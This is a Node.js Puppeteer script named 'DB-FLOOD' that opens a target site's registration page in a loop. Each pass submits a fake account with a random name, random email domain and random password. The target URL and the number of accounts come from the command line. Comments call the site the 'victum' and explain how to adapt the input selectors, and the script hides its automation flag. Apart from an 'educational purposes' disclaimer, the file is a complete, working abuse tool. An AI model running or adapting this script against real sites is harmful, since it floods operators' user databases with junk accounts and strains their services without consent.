/*
     _____     ____
    /      \  |  o | 
   |        |/ ___\| 
   |_________/     
   |_|_| |_|_| v1.0
   
   Made by @Liam1337
   Usage: node main.js
   
   Release date of v1.0 23.09.2022

   NOTE if you use a Linux OS:
   UNDER LINUX ACTIVATE THE DIRECTORY OF THE CHROMIUM BROWSER AND CHANGE THE HEADLESS MODE (true)
   and then change the path of the Chromium browser in the puppeteer.launch() function

   Windows: executablePath: "./node_modules/puppeteer/.local-chromium/win64-982053/chrome-win/chrome.exe",
   Linux  : executablePath: "/usr/bin/chromium-browser",

   Set headless: false to true  <- ONLY Linux

   Install chrome browser:
   apt install chromium-browser
*/

const puppeteer = require('puppeteer');
const fs = require('fs');

var colors = require('colors');
var random_name = require('node-random-name');

const Status = require("./Handlers/Functions");
const url = process.argv[2];
const amount = process.argv[3];

const UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
];

const emails = [
    "gmail.com", 
    "hotmail.com", 
    "gmx.net", 
    "gmx.at", 
    "web.de", 
    "yahoo.com", 
    "aol.com", 
    "msn.com", 
    "mail.ru", 
    "hotmail.co.uk", 
    "hotmail.fr", 
    "free.fr"
];


if (process.argv.length < 4) {
	console.log(`                       
        Usage: node main <register> <how many users>
        Usage: node main http://example.com/register.php 10
        -------------------------------------------------------
        https://github.com/Liam1337/ | DB-FLOOD
        Made for ducational Purposes ONLY By @Liam1337                                       
    `.rainbow);
	process.exit(-1);
};


(async () => {

    const browser = await puppeteer.launch({

        headless: false, // set false to true if you are using a Linux OS
        defaultViewport: null,
        ignoreDefaultArgs: ["--enable-automation"],
        //executablePath: "./node_modules/puppeteer/.local-chromium/win64-982053/chrome-win/chrome.exe", <- Windows
        //executablePath: "/usr/bin/chromium-browser",                                                   <- Linux

        args: [// Args for the browser emulation
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--use-gl=desktop',
            '--use-gl=egl',
            '--window-size=1920x1080',
            '--enable-automation'
        ]
    });


    let i = 1;
    console.log(`${Status.InfoColor}`, `Starting Browser Engine!`); // Start browser
    while (i <= parseInt(amount)) { // Loop
    
        const page = await browser.newPage();
        await page.setViewport({ width: 1920, height: 1080});
        await page.setUserAgent(UserAgents[Math.floor(Math.random() * UserAgents.length)]);
        await page.setJavaScriptEnabled(true);
        await page.goto(url);
    
        // Register
        var user = random_name({ first: true});
        var rando = emails[Math.floor(Math.random() * emails.length)];
    
        //console.log(user);
        /*

         Change the input of your victum https://i.imgur.com/pGgeUYO.png

        */
        await page.type('input[name=register-username]', user); // Random "real" username
        //console.log(rando);
        await page.type('input[name=register-email]', user + "@" + rando); // random email provider
    
    
        var passwd = Math.random().toString(36); // random string as passwd
        //console.log(passwd);
        await page.type('input[name=register-password]', passwd);
        await page.type('input[name=register-password2]', passwd);
    
        await page.keyboard.press('Enter');
        await page.close();
        console.log(`${Status.DebugColor}`, `1 user created`);
        i++;

    };
    await browser.close();
    console.log(`${Status.SuccessColor}`, + amount + ` user/s created!`); // Success print
})();
